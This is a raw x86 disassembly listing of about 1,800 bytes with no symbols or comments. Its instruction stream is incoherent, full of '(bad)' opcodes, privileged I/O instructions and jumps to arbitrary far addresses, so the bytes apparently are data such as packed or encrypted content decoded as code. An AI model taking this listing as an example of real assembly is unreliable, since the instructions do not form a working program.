  4053af:	bound  ebx,QWORD PTR [ecx+ecx*4-0x43713e12]
  4053b6:	repz mov eax,ds:0xe7ec982
  4053bc:	ins    DWORD PTR es:[edi],dx
  4053bd:	mov    bh,0x9f
  4053bf:	lea    ebp,[edi-0x4a]
  4053c2:	adc    al,0x5e
  4053c4:	or     DWORD PTR [ebx-0x18],eax
  4053c7:	scas   al,BYTE PTR es:[edi]
  4053c8:	iret   
  4053c9:	xchg   esi,eax
  4053ca:	jp     0x4053ee
  4053cc:	int    0x31
  4053ce:	and    DWORD PTR [edi+0x5ad3a526],eax
  4053d4:	addr16 mov al,ds:0x851e
  4053d8:	stos   BYTE PTR es:[edi],al
  4053d9:	cwde   
  4053da:	jmp    0x8f45:0xec6673a0
  4053e1:	outs   dx,DWORD PTR ds:[esi]
  4053e2:	in     eax,0x29
  4053e4:	or     ebp,ebx
  4053e6:	jp     0x405377
  4053e8:	daa    
  4053e9:	mov    al,ds:0x214e3857
  4053ee:	dec    edi
  4053ef:	and    DWORD PTR [eax-0x37],0x8160192
  4053f6:	xor    eax,0xce4f0c4c
  4053fb:	mov    eax,ds:0x6aefa8e7
  405400:	mov    ebx,0x67db020d
  405405:	mov    ds:0xc8da2f67,al
  40540a:	jno    0x4053f1
  40540c:	imul   ebp,DWORD PTR [eax+0x41fc0507],0xefd1128a
  405416:	leave  
  405417:	(bad)  
  405418:	aas    
  405419:	cdq    
  40541a:	adc    bl,dl
  40541c:	and    edi,DWORD PTR [ecx+0x2]
  40541f:	in     eax,dx
  405420:	cdq    
  405421:	mov    ah,0x95
  405423:	adc    edi,DWORD PTR [edx+0x146af7f4]
  405429:	(bad)  
  40542a:	and    eax,0x9f026f90
  40542f:	jecxz  0x40540f
  405431:	adc    DWORD PTR [ebx],esp
  405433:	sub    al,0x8a
  405435:	add    BYTE PTR [edx],al
  405437:	outs   dx,BYTE PTR ds:[esi]
  405438:	aam    0x15
  40543a:	xor    ebp,eax
  40543c:	dec    ebp
  40543d:	push   esi
  40543e:	gs push 0x7a7c5807
  405444:	jae    0x4054a4
  405446:	loopne 0x4054a0
  405448:	inc    DWORD PTR [ecx]
  40544a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40544b:	add    DWORD PTR [edx],esp
  40544d:	xor    al,BYTE PTR [ebx]
  40544f:	xor    BYTE PTR [ecx+eax*2-0x57],dl
  405453:	pop    esp
  405454:	add    ah,ch
  405456:	and    ebp,edx
  405458:	push   ss
  405459:	pop    ebp
  40545a:	icebp  
  40545b:	adc    DWORD PTR [ebp+0x3c],edi
  40545e:	inc    esi
  40545f:	sub    dh,BYTE PTR [ecx+0x73c04dd9]
  405465:	out    0x19,eax
  405467:	cmp    DWORD PTR [edi-0x43824bc2],esi
  40546d:	sbb    DWORD PTR [ecx+0x4],esi
  405470:	xchg   edx,eax
  405471:	cwde   
  405472:	in     al,dx
  405473:	(bad)  
  405474:	cli    
  405475:	out    dx,al
  405476:	pop    ebp
  405477:	xor    ecx,ebp
  405479:	xor    al,0x34
  40547b:	(bad)  
  40547c:	loope  0x405475
  40547e:	(bad)  
  40547f:	out    dx,al
  405480:	jmp    0x405453
  405482:	xor    DWORD PTR ds:0x3c89cb3e,0x7cd81bde
  40548c:	arpl   dx,bp
  40548e:	pop    ecx
  40548f:	xchg   edi,eax
  405490:	sub    eax,0x974eb675
  405495:	jne    0x4054a4
  405497:	mov    BYTE PTR [esi+0x51],ah
  40549a:	stc    
  40549b:	adc    al,BYTE PTR [edi-0x566ab59d]
  4054a1:	adc    BYTE PTR [ecx+0x3d],ah
  4054a4:	and    al,0xf3
  4054a6:	jne    0x405501
  4054a8:	mov    edx,0xb17a8b7d
  4054ad:	jmp    0x405465
  4054af:	repz push 0xffffff99
  4054b2:	mov    ds,WORD PTR [ecx+0x6d]
  4054b5:	popf   
  4054b6:	mov    ebx,0x877b19d2
  4054bb:	jge    0x4054a0
  4054bd:	push   0x1c
  4054bf:	push   cs
  4054c0:	mov    al,0x5c
  4054c2:	ret    
  4054c3:	mov    ds:0x1acc98f3,al
  4054c8:	jne    0x4054e6
  4054ca:	xor    eax,0xc5dba25c
  4054cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054d0:	lahf   
  4054d1:	xchg   BYTE PTR [ebx+ecx*4+0x23],ch
  4054d5:	add    bl,BYTE PTR [esi]
  4054d7:	inc    esi
  4054d8:	rol    BYTE PTR [ebp-0x22ca5e33],cl
  4054de:	mov    esi,0x8a147ce
  4054e3:	test   eax,0x5cb3ef5c
  4054e8:	in     al,dx
  4054e9:	shld   eax,ebx,0x18
  4054ed:	or     al,0x18
  4054ef:	cmp    eax,DWORD PTR [esp+0x7ab3956e]
  4054f6:	dec    ebx
  4054f7:	std    
  4054f8:	clc    
  4054f9:	fidivr DWORD PTR [edx+0x7c]
  4054fc:	sub    al,0x9
  4054fe:	retf   0x90e9
  405501:	xchg   cl,bh
  405503:	adc    BYTE PTR [ecx],0x96
  405506:	not    BYTE PTR [edx+0x16]
  405509:	and    al,0xd2
  40550b:	lock iret 
  40550d:	in     eax,0x69
  40550f:	out    dx,al
  405510:	pop    edi
  405511:	js     0x4054f9
  405513:	mov    al,al
  405515:	xor    BYTE PTR [esi],0xd9
  405518:	jg     0x405500
  40551a:	cdq    
  40551b:	lods   al,BYTE PTR ds:[esi]
  40551c:	ficomp DWORD PTR [ecx+0x366b1083]
  405522:	and    bl,0x7f
  405525:	repz les esi,FWORD PTR [esi-0x14]
  405529:	inc    ecx
  40552a:	inc    ecx
  40552b:	enter  0x4e0f,0x8d
  40552f:	inc    BYTE PTR [esi]
  405531:	dec    edi
  405532:	mov    dl,0xe6
  405534:	(bad)  
  405535:	cmp    al,0xcd
  405537:	ficom  WORD PTR [ebx]
  405539:	fs hlt 
  40553b:	mov    esp,0xe473345c
  405540:	retf   
  405541:	inc    ebx
  405542:	ret    0xa7f8
  405545:	call   0x791e:0x799cfa8b
  40554c:	jl     0x40552f
  40554e:	adc    BYTE PTR [ebx],dl
  405550:	das    
  405551:	jmp    0x9d99bc37
  405556:	inc    ebx
  405557:	add    BYTE PTR [esi],0xfa
  40555a:	push   edx
  40555b:	pop    ds
  40555c:	xchg   al,ah
  40555e:	jmp    0x4055d3
  405560:	inc    eax
  405561:	dec    edi
  405562:	pop    edi
  405563:	mov    bl,0x7a
  405565:	sub    ch,BYTE PTR [ecx]
  405567:	popf   
  405568:	sbb    al,BYTE PTR [esi+0x656f7c8]
  40556e:	ss or  al,0x4e
  405571:	xor    BYTE PTR [ebx-0x23],al
  405574:	and    eax,DWORD PTR [edi+0x7a8b7173]
  40557a:	arpl   WORD PTR [edi],ax
  40557c:	jmp    0xa64b5d18
  405581:	dec    ebp
  405582:	mov    ah,0xc7
  405584:	fs call 0x15d6:0xc8622295
  40558c:	add    BYTE PTR [ebx],bl
  40558e:	inc    esi
  40558f:	and    BYTE PTR [edi+0x43],ah
  405592:	cwde   
  405593:	mov    edx,0x7c5df25b
  405598:	push   eax
  405599:	fstp   DWORD PTR [ecx+0x1b]
  40559c:	xchg   al,ah
  40559e:	mov    bh,0x5
  4055a0:	adc    BYTE PTR [eax+0x4c115c48],al
  4055a6:	(bad)  
  4055a7:	pop    ebx
  4055a8:	inc    ebx
  4055a9:	lock and ebp,DWORD PTR [ebp+edx*4-0x29610e0e]
  4055b1:	push   ebx
  4055b2:	sub    ebx,DWORD PTR [edx+0x1e]
  4055b5:	ins    BYTE PTR es:[edi],dx
  4055b6:	pop    ebp
  4055b7:	fimul  WORD PTR [edx-0x5be493e6]
  4055bd:	jg     0x40554a
  4055bf:	jp     0x405592
  4055c1:	in     eax,0x65
  4055c3:	xlat   BYTE PTR ds:[ebx]
  4055c4:	sub    eax,DWORD PTR [eax]
  4055c6:	jno    0x4055bc
  4055c8:	push   0x60dc7359
  4055cd:	dec    eax
  4055ce:	js     0x405600
  4055d0:	mov    esi,0x86369861
  4055d5:	ins    DWORD PTR es:[edi],dx
  4055d6:	dec    esp
  4055d7:	xor    eax,0x7034829d
  4055dc:	jbe    0x4055ae
  4055de:	clc    
  4055df:	enter  0xa4d0,0xa
  4055e3:	sahf   
  4055e4:	loopne 0x4055db
  4055e6:	outs   dx,DWORD PTR ds:[esi]
  4055e7:	inc    esp
  4055e8:	adc    al,0x11
  4055ea:	mov    bh,0x32
  4055ec:	jo     0x4055a1
  4055ee:	xor    ah,dh
  4055f0:	or     BYTE PTR [ebx+0x3d],al
  4055f3:	sbb    DWORD PTR [ecx],ebx
  4055f5:	(bad)  [edx-0x18116e7b]
  4055fb:	out    dx,al
  4055fc:	shl    BYTE PTR [edx+0x1bda7891],cl
  405602:	push   ebp
  405603:	add    al,0xd7
  405605:	xlat   BYTE PTR ds:[ebx]
  405606:	pop    ds
  405607:	sub    al,0x1d
  405609:	mov    ebx,0x689c3e8b
  40560e:	xchg   ch,dh
  405610:	mov    al,gs:0x4506960
  405616:	xor    DWORD PTR [esi-0x70],0x25
  40561a:	pop    edi
  40561b:	xchg   esi,eax
  40561c:	call   0x430979ac
  405621:	add    edi,ebx
  405623:	pop    esp
  405624:	xchg   edi,eax
  405625:	jbe    0x405643
  405627:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405628:	je     0x405606
  40562a:	sub    al,0x8
  40562c:	test   BYTE PTR [edi],al
  40562e:	add    DWORD PTR [ebx+0x30],0xffffffd8
  405632:	inc    ebp
  405633:	or     ebx,esp
  405635:	mov    fs,WORD PTR [ecx+0x70bb7679]
  40563b:	gs mov ebp,0xc5e52234
  405641:	add    al,0xb4
  405643:	mov    esi,DWORD PTR [edx+0x10]
  405646:	and    DWORD PTR [edi],0xffffff89
  405649:	sub    al,0xd1
  40564b:	mov    ds:0x84653e45,eax
  405650:	xchg   ecx,eax
  405651:	inc    esp
  405652:	les    ebp,FWORD PTR gs:[edi]
  405655:	popf   
  405656:	mov    ebp,0xad8b37f6
  40565b:	or     DWORD PTR [ebx+esi*1+0x69a33b84],ebp
  405662:	adc    eax,DWORD PTR [bp+si-0x728e]
  405667:	je     0x4056e1
  405669:	push   ecx
  40566a:	test   BYTE PTR [esi],0xf
  40566d:	sbb    ecx,DWORD PTR [ebp-0x2b00b88e]
  405673:	scas   al,BYTE PTR es:[edi]
  405674:	lock ror DWORD PTR [eax],1
  405677:	jl     0x4056d8
  405679:	xor    al,0x59
  40567b:	daa    
  40567c:	sub    edx,DWORD PTR [esi+0x6bf4967a]
  405682:	push   ds
  405683:	in     al,dx
  405684:	out    0x2e,al
  405686:	dec    ebx
  405687:	sahf   
  405688:	gs dec eax
  40568a:	in     al,0x1
  40568c:	xor    ebx,DWORD PTR [esi+0x51]
  40568f:	sub    ecx,DWORD PTR [ebx]
  405691:	sub    BYTE PTR [edi+0x16d7610d],dl
  405697:	loop   0x405695
  405699:	sub    BYTE PTR [eax],dh
  40569b:	push   edi
  40569c:	jmp    0xe9f5036b
  4056a1:	or     ah,BYTE PTR [ebp-0x60459b02]
  4056a7:	dec    ecx
  4056a8:	inc    esi
  4056a9:	cmp    BYTE PTR [edi-0xd3c9faf],dl
  4056af:	(bad)  [ebp-0x28a5c82b]
  4056b5:	sbb    esp,DWORD PTR [eax-0x672ddc3a]
  4056bb:	adc    edx,DWORD PTR [edx]
  4056bd:	cs loop 0x405662
  4056c0:	sub    al,0xe8
  4056c2:	xchg   esp,eax
  4056c3:	push   ss
  4056c4:	jecxz  0x405710
  4056c6:	or     eax,0xc1c84b24
  4056cb:	or     al,0x26
  4056cd:	inc    ebp
  4056ce:	adc    eax,0x9ba2f9ad
  4056d3:	shr    BYTE PTR [esi+0x64356a12],1
  4056d9:	lea    edx,[ebp-0x2bce0671]
  4056df:	js     0x405745
  4056e1:	inc    ecx
  4056e2:	inc    edx
  4056e3:	jmp    0x4056e8
  4056e5:	add    eax,0x194a0f7b
  4056ea:	mov    eax,0xef9bb4b9
  4056ef:	dec    eax
  4056f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056f1:	inc    esp
  4056f2:	rcr    ecx,1
  4056f4:	hlt    
  4056f5:	push   ecx
  4056f6:	add    eax,0x6c55d788
  4056fb:	out    dx,eax
  4056fc:	(bad)  
  4056fd:	or     al,BYTE PTR [edx+0x6c]
  405700:	sbb    BYTE PTR [ebx-0x4e],ah
  405703:	adc    al,0x24
  405705:	xchg   DWORD PTR [edx],ebx
  405707:	inc    esi
  405708:	dec    ebx
  405709:	adc    ah,BYTE PTR [esp+edx*8]
  40570c:	mov    esp,0x3d5098ac
  405711:	hlt    
  405712:	adc    ah,BYTE PTR [edx-0x11]
  405715:	fisttp WORD PTR [edi]
  405717:	inc    eax
  405718:	rol    ah,cl
  40571a:	ins    DWORD PTR es:[edi],dx
  40571b:	nop
  40571c:	push   cs
  40571d:	aad    0x8f
  40571f:	xchg   BYTE PTR [edi-0x65],al
  405722:	inc    esp
  405723:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405724:	push   ecx
  405725:	or     DWORD PTR [eax+edx*2-0x71abd771],edi
  40572c:	xchg   edx,eax
  40572d:	cmc    
  40572e:	das    
  40572f:	int    0xac
  405731:	lods   eax,DWORD PTR ds:[esi]
  405732:	scas   eax,DWORD PTR es:[edi]
  405733:	cmp    DWORD PTR [edx+0x61],0x2b97da96
  40573a:	jns    0x40575d
  40573c:	and    esp,ebp
  40573e:	xchg   BYTE PTR [ecx],dh
  405740:	cdq    
  405741:	mov    gs,WORD PTR [ecx]
  405743:	int    0x66
  405745:	dec    eax
  405746:	mov    edx,0x3927d3ac
  40574b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40574c:	sub    BYTE PTR [ecx+0x7a],dl
  40574f:	mov    al,0x67
  405751:	ins    DWORD PTR es:[edi],dx
  405752:	jae    0x4056fb
  405754:	xchg   esi,eax
  405755:	jge    0x4057ae
  405757:	dec    ebx
  405758:	or     al,0xc4
  40575a:	cmp    ch,al
  40575c:	and    eax,0x838bc5ae
  405761:	fld    QWORD PTR [ebp-0x2f]
  405764:	cmp    DWORD PTR [esi+ebp*8],esi
  405767:	xchg   esp,eax
  405768:	retf   
  405769:	sbb    ebp,DWORD PTR [ebp-0x25894774]
  40576f:	(bad)  [edx+ecx*4-0x6c628049]
  405776:	fstp   QWORD PTR [edx+0x6cf7c438]
  40577c:	ret    0x79ed
  40577f:	pusha  
  405780:	mov    al,ds:0x3feedb3f
  405785:	jecxz  0x4057c4
  405787:	inc    edx
  405788:	test   eax,0x8d328eb7
  40578d:	pushf  
  40578e:	nop    DWORD PTR [ebx+ebp*8+0x10]
  405793:	add    ebx,edi
  405795:	sub    DWORD PTR [ecx-0x24],ecx
  405798:	inc    edi
  405799:	cmp    BYTE PTR [eax],ah
  40579b:	shr    BYTE PTR [ebx],0xa2
  40579e:	into   
  40579f:	fisttp QWORD PTR [ecx]
  4057a1:	pop    ebp
  4057a2:	aas    
  4057a3:	(bad)  [ebx]
  4057a5:	mov    ds:0x91dd3988,eax
  4057aa:	(bad)  
  4057ab:	aaa    
  4057ac:	jae    0x4057af
  4057ae:	sub    eax,edi
  4057b0:	imul   esp,esi,0xc22cbae3
  4057b6:	mov    cl,0xd2
  4057b8:	mov    dh,0x16
  4057ba:	cmp    dh,BYTE PTR [ebx]
  4057bc:	pop    ebp
  4057bd:	jno    0x4057ac
  4057bf:	add    DWORD PTR [edx],edi
  4057c1:	cmovle esp,DWORD PTR [ebx]
  4057c4:	(bad)  
  4057c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057c6:	leave  
  4057c7:	pushf  
  4057c8:	push   esp
  4057c9:	pop    esi
  4057ca:	jo     0x4057bb
  4057cc:	int    0x74
  4057ce:	cmp    al,BYTE PTR [esi+eax*8-0x47]
  4057d2:	mov    dl,0x57
  4057d4:	dec    ebx
  4057d5:	push   ebx
  4057d6:	jnp    0x4057d0
  4057d8:	jl     0x405835
  4057da:	xor    esi,DWORD PTR [eax]
  4057dc:	mov    ebp,0x61d97a54
  4057e1:	retf   0x948c
  4057e4:	inc    sp
  4057e6:	es or  al,0xf9
  4057e9:	mov    es,ebp
  4057eb:	fcom   st(0)
  4057ed:	cmp    ah,ch
  4057ef:	sti    
  4057f0:	mov    esi,0xe1f7652
  4057f5:	pop    es
  4057f6:	xchg   BYTE PTR [ebx+0x35],bl
  4057f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057fa:	in     eax,dx
  4057fb:	or     dh,BYTE PTR [esi+0xeedb7bd]
  405801:	push   eax
  405802:	add    al,0x85
  405804:	test   al,0x71
  405806:	or     eax,0xd3a92b7b
  40580b:	jns    0x4057e0
  40580d:	cwde   
  40580e:	mov    eax,esp
  405810:	cld    
  405811:	mov    esp,0xae67c5db
  405816:	imul   esi,DWORD PTR [edi+eiz*1],0x2c
  40581a:	jp     0x405848
  40581c:	lahf   
  40581d:	mov    ah,0xe0
  40581f:	lods   eax,DWORD PTR ds:[esi]
  405820:	mov    ch,ch
  405822:	dec    esp
  405823:	icebp  
  405824:	cmp    DWORD PTR ds:0xc8fda09a,0xffffff81
  40582b:	push   cs
  40582c:	inc    ecx
  40582d:	push   eax
  40582e:	pop    esp
  40582f:	mov    esi,0x71f962c
  405834:	dec    esp
  405835:	inc    esi
  405836:	sbb    DWORD PTR [ebp-0x7943138d],eax
  40583c:	retf   0xb3ec
  40583f:	sbb    edx,edx
  405841:	mov    ds:0x2560e61d,al
  405846:	and    al,0x1c
  405848:	ins    DWORD PTR es:[edi],dx
  405849:	(bad)  cs:[edx-0x55]
  40584d:	mov    bh,0x3b
  40584f:	xchg   esp,eax
  405850:	outs   dx,DWORD PTR ds:[esi]
  405851:	sbb    BYTE PTR [edx-0x752f92f7],ah
  405857:	into   
  405858:	imul   edx,DWORD PTR [edi],0xe39d8a85
  40585e:	in     eax,0x54
  405860:	dec    ecx
  405861:	pop    ecx
  405862:	stc    
  405863:	xor    dl,ch
  405865:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405866:	fwait
  405867:	adc    al,0x51
  405869:	or     ebp,DWORD PTR [esi-0x1a6ae216]
  40586f:	in     al,dx
  405870:	sar    BYTE PTR [ecx],0x65
  405873:	cdq    
  405874:	sbb    dl,al
  405876:	pop    ds
  405877:	js     0x405899
  405879:	(bad)  
  40587a:	xor    al,BYTE PTR ds:0x8daea7d9
  405880:	retf   0x65f4
  405883:	cmp    eax,0x6cbb8803
  405888:	repz test ebx,ebp
  40588b:	xchg   ecx,eax
  40588c:	std    
  40588d:	js     0x4058a9
  40588f:	into   
  405890:	add    BYTE PTR [ebx],dh
  405892:	jle    0x4058be
  405894:	and    al,0xc8
  405896:	retf   0x7271
  405899:	icebp  
  40589a:	outs   dx,DWORD PTR ds:[esi]
  40589b:	psubd  mm0,QWORD PTR [ebx+0x66]
  40589f:	jne    0x4058d1
  4058a1:	outs   dx,BYTE PTR ds:[esi]
  4058a2:	push   esp
  4058a3:	sbb    BYTE PTR [esi+0x279043e7],0x27
  4058aa:	push   esi
  4058ab:	clc    
  4058ac:	call   0x32497f58
  4058b1:	sub    cl,BYTE PTR [ebp+esi*8+0x56]
  4058b5:	lods   eax,DWORD PTR ds:[esi]
  4058b6:	pusha  
  4058b7:	aam    0xa6
  4058b9:	call   0x3f1b7806
  4058be:	dec    esi
  4058bf:	xor    esi,edx
  4058c1:	(bad)  
  4058c2:	and    eax,0xa5dbd4dd
  4058c7:	inc    esp
  4058c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4058c9:	xchg   ecx,eax
  4058ca:	jmp    0xf8953e84
  4058cf:	neg    DWORD PTR [ebp+0x4321534d]
  4058d5:	cmp    al,0xa8
  4058d7:	test   DWORD PTR [esi-0x33],0x4fb21cc1
  4058de:	es adc al,0xe1
  4058e1:	cdq    
  4058e2:	jmp    0x405912
  4058e4:	add    ah,BYTE PTR [edi-0x3b067002]
  4058ea:	adc    eax,0xa8f5fe2c
  4058ef:	mov    DWORD PTR [eax],ecx
  4058f1:	daa    
  4058f2:	out    0x94,al
  4058f4:	leave  
  4058f5:	enter  0x5b19,0xb5
  4058f9:	cdq    
  4058fa:	stos   DWORD PTR es:[edi],eax
  4058fb:	push   edx
  4058fc:	(bad)
  405900:	dec    ebp
  405901:	mov    edi,DWORD PTR [ecx-0x21]
  405904:	out    dx,al
  405905:	add    al,0x22
  405907:	loopne 0x40593b
  405909:	(bad)  
  40590a:	cwde   
  40590b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40590c:	std    
  40590d:	xchg   edi,eax
  40590e:	adc    al,0xae
  405910:	div    edi
  405912:	fcomp  DWORD PTR [ebp+0x68]
  405915:	xor    al,BYTE PTR [esi-0x16]
  405918:	stos   BYTE PTR es:[edi],al
  405919:	adc    BYTE PTR ds:0xc49a00df,ah
  40591f:	fcom   st(0)
  405921:	sar    dl,1
  405923:	xor    al,0x2b
  405925:	sbb    al,0xf
  405927:	lds    eax,FWORD PTR [edi+edx*1+0x33]
  40592b:	mov    eax,ds:0x1b25306a
  405930:	dec    ebp
  405931:	mov    edx,0x13b767b1
  405936:	push   0x38
  405938:	in     al,dx
  405939:	add    eax,0x79163a09
  40593e:	inc    edx
  40593f:	dec    edi
  405940:	(bad)  
  405941:	clc    
  405942:	mov    edx,0x6764b912
  405947:	icebp  
  405948:	jge    0x4058fa
  40594a:	xchg   ecx,eax
  40594b:	or     ch,dl
  40594d:	loop   0x40594c
  40594f:	outs   dx,DWORD PTR ds:[esi]
  405950:	xchg   BYTE PTR [ecx+0x3e],dh
  405953:	pop    esp
  405954:	sbb    DWORD PTR [eax],ebp
  405956:	sbb    BYTE PTR [ebp-0x67],dh
  405959:	adc    edi,DWORD PTR [di]
  40595c:	fcomp  st(6)
  40595e:	int3   
  40595f:	jecxz  0x405970
  405961:	cmp    edx,ebp
  405963:	push   esp
  405964:	inc    esp
  405965:	sub    dh,BYTE PTR [edx+0x583d489c]
  40596b:	popf   
  40596c:	sbb    ebx,DWORD PTR [edi-0x24]
  40596f:	jmp    0x670:0xed19d45c
  405976:	test   BYTE PTR [ecx-0x2],bh
  405979:	fisub  DWORD PTR ds:0x644945ec
  40597f:	retf   
  405980:	bound  edi,QWORD PTR [ebx]
  405982:	out    0xd7,eax
  405984:	lock xchg edx,eax
  405986:	fs dec eax
  405988:	and    al,0x5e
  40598a:	push   0xffffffc1
  40598c:	leave  
  40598d:	inc    esi
  40598e:	inc    edx
  40598f:	add    al,0x88
  405991:	pop    edx
  405992:	fs (bad) 
  405994:	sbb    dh,cl
  405996:	stc    
  405997:	sbb    al,0xfc
  405999:	les    ecx,FWORD PTR [edi+0x7]
  40599c:	rol    esi,0xd7
  40599f:	jl     0x4059af
  4059a1:	jne    0x405a18
  4059a3:	or     bl,BYTE PTR [ecx+edx*4-0x37]
  4059a7:	(bad)  
  4059a8:	or     ebx,DWORD PTR [edi-0x32]
  4059ab:	jnp    0x405947
  4059ad:	out    0x6b,al
  4059af:	mov    cl,0x1c
  4059b1:	fisubr WORD PTR [ebx-0x55]
  4059b4:	mov    ah,0xc
  4059b6:	rol    BYTE PTR ds:0x107802fb,1
  4059bc:	pop    ds
  4059bd:	inc    esi
  4059be:	cmp    dh,bl
  4059c0:	sub    eax,0x526a443c
  4059c5:	jmp    0xeafebcc8
  4059ca:	push   esi
  4059cb:	cmp    BYTE PTR [ecx-0x2ceff19c],bl
  4059d1:	sbb    edx,DWORD PTR [edx-0x76]
  4059d4:	sub    BYTE PTR [edx+0x46ca375c],bh
  4059da:	add    al,0xb
  4059dc:	push   esp
  4059dd:	xchg   ecx,eax
  4059de:	ja     0x405978
  4059e0:	xchg   esi,eax
  4059e1:	xor    al,0x61
  4059e3:	dec    eax
  4059e4:	mov    bh,0xe1
  4059e6:	inc    edx
  4059e7:	es mov ecx,0xfa170411
  4059ed:	dec    eax
  4059ee:	repnz pop es
  4059f0:	sbb    eax,0xd171db3e
  4059f5:	fsub   QWORD PTR [eax+0x68]
  4059f8:	ins    DWORD PTR es:[edi],dx
  4059f9:	fs pop es
  4059fb:	and    al,0x90
  4059fd:	cwde   
  4059fe:	pop    edx
  4059ff:	in     al,dx
  405a00:	out    dx,eax
  405a01:	lahf   
  405a02:	imul   ebx,DWORD PTR [ecx-0x50482f15],0x65bdca70
  405a0c:	sti    
  405a0d:	xor    bh,BYTE PTR [edi+ebx*2+0x44a83e5e]
  405a14:	neg    BYTE PTR [ecx-0x17c61088]
  405a1a:	cmc    
  405a1b:	xor    ch,cl
  405a1d:	push   ebp
  405a1e:	xor    bh,ah
  405a20:	xor    ebx,DWORD PTR [edx]
  405a22:	aam    0xd9
  405a24:	cmc    
  405a25:	mov    WORD PTR [esi+eax*1-0x70],?
  405a29:	cdq    
  405a2a:	jae    0x405a8a
  405a2c:	xor    eax,DWORD PTR [ebx+0x531df91]
  405a32:	call   0x98e1:0x9bb81093
  405a39:	sub    BYTE PTR [edi-0x6ab6b3db],0x56
  405a40:	shl    DWORD PTR cs:[ecx-0x1f73d72],1
  405a47:	mov    eax,ds:0xfc5ea5e1
  405a4c:	stos   DWORD PTR es:[edi],eax
  405a4d:	pop    esi
  405a4e:	hlt    
  405a4f:	sahf   
  405a50:	xor    BYTE PTR [esi-0x1509ae73],0x72
  405a57:	icebp  
  405a58:	mov    ds:0xdd93c10,al
  405a5d:	add    al,0xf3
  405a5f:	push   ss
  405a60:	fldenv [esp+ebx*2-0x6c]
  405a64:	(bad)  
  405a65:	sub    al,0x52
  405a67:	rcr    BYTE PTR [edi-0xbb374d3],0x71
  405a6e:	xchg   edx,eax
  405a6f:	xchg   edx,eax
  405a70:	aas    
  405a71:	mov    fs,WORD PTR [edi-0x55a87efe]
  405a77:	sar    BYTE PTR [edi+0x1e],cl
  405a7a:	mov    esp,0x4feb82af
  405a7f:	inc    esi
  405a80:	sub    eax,0xc6e3dd10
  405a85:	pop    eax
  405a86:	cmp    dl,al
  405a88:	dec    esi
  405a89:	mov    edi,0xa80ed5e8
  405a8e:	and    al,0x13
  405a90:	mov    ch,0x9f
  405a92:	dec    esi
  405a93:	(bad)  
  405a94:	pop    esi
  405a95:	das    
  405a96:	push   ecx
  405a97:	in     al,0xe2
  405a99:	sbb    BYTE PTR [ebx+0x7b0abd27],ch
  405a9f:	cwde   
  405aa0:	push   es
  405aa1:	shl    BYTE PTR [edi+0x17],0x83
  405aa5:	(bad)  [ecx]
  405aa7:	cwde   
  405aa8:	dec    ebp
  405aa9:	xor    al,0xb0
  405aab:	push   ds
  405aac:	addr16 in eax,0x63
  405aaf:	add    al,0x1d
  405ab1:	sub    al,0x7a
  405ab3:	(bad)  
  405ab5:	add    eax,0xea4ec1c1
  405aba:	sub    eax,0x9e6f02a0
  405abf:	cmp    ax,0x23a8
  405ac3:	push   ecx
  405ac4:	xchg   esi,eax
  405ac5:	fs nop
  405ac7:	dec    edi
  405ac8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ac9:	idiv   DWORD PTR [esp+edi*2+0x36]
  405acd:	jbe    0x405ace
  405acf:	cmp    al,0x39
  405ad1:	hlt    
  405ad2:	into   
  405ad3:	iret   
  405ad4:	(bad)  
  405ad5:	int3   
  405ad6:	pop    ecx
  405ad7:	inc    edi
  405ad8:	push   esp
  405ad9:	into   
  405ada:	call   0xa67a:0x63b2094f
  405ae1:	aas    
  405ae2:	test   al,0x22
  405ae4:	and    DWORD PTR [ebp-0x78],edi
  405ae7:	(bad)
  405aea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405aeb:	mov    ds:0x88c6fe90,al
  405af0:	jmp    0x51c3c57
  405af5:	mov    edx,0x8a87af03
  405afa:	xchg   esp,eax
  405afb:	stc    
  405afc:	mov    ebx,0xba8306f6
  405b01:	xchg   edi,eax
  405b02:	or     eax,DWORD PTR [ebp-0x5b]
  405b05:	fdivr  st(4),st
  405b07:	hlt    
  405b08:	mov    dh,0x63
  405b0a:	addr16 jg 0x405b10
  405b0d:	sub    DWORD PTR [edi+0x5d],esp
  405b10:	rcl    DWORD PTR [edi],0x39
  405b13:	mov    al,ds:0x41fb1bf1
  405b18:	rcl    DWORD PTR [ebx],cl
  405b1a:	pop    ebp
  405b1b:	popf   
  405b1c:	std    
  405b1d:	jmp    0x405b1b
  405b1f:	rcr    BYTE PTR [ebx-0x2733c171],1
  405b25:	and    ch,dl
  405b27:	in     al,dx
  405b28:	(bad)  
  405b29:	test   al,0x4a
  405b2b:	imul   BYTE PTR ss:[eax+0x9fb44fe]
  405b32:	addr16 sbb al,0x8e
  405b35:	shl    BYTE PTR ds:0x9f7932b7,cl
  405b3b:	nop
  405b3c:	cdq    
  405b3d:	mov    al,ss:0x7eb4f3da
  405b43:	cmp    eax,0x539b100
  405b48:	or     al,0x3f
  405b4a:	push   esi
  405b4b:	addr16 icebp 
  405b4d:	retw   
  405b4f:	sbb    al,0x14
  405b51:	(bad)  
  405b52:	pop    edx
  405b53:	int3   
  405b54:	(bad)  
  405b55:	jnp    0x405ade
  405b57:	mov    ah,0x2d
  405b59:	aam    0x62
  405b5b:	push   0x4e
  405b5d:	adc    DWORD PTR gs:[ebx],esi
  405b60:	or     eax,0x872ba624
  405b65:	int    0x6e
  405b67:	and    BYTE PTR [ebp+ebx*1-0x14],dh
  405b6b:	jno    0x405bb1
  405b6d:	dec    edi
  405b6e:	into   
  405b6f:	mov    eax,ds:0xcee26c2a
  405b74:	rol    DWORD PTR [eax],0x34
  405b77:	stos   BYTE PTR es:[edi],al
  405b78:	mov    ch,0xb5
  405b7a:	sti    
  405b7b:	add    al,dl
  405b7d:	and    DWORD PTR [edx-0x1c1b5080],eax
  405b83:	adc    al,0xa
  405b85:	cs jo  0x405b40
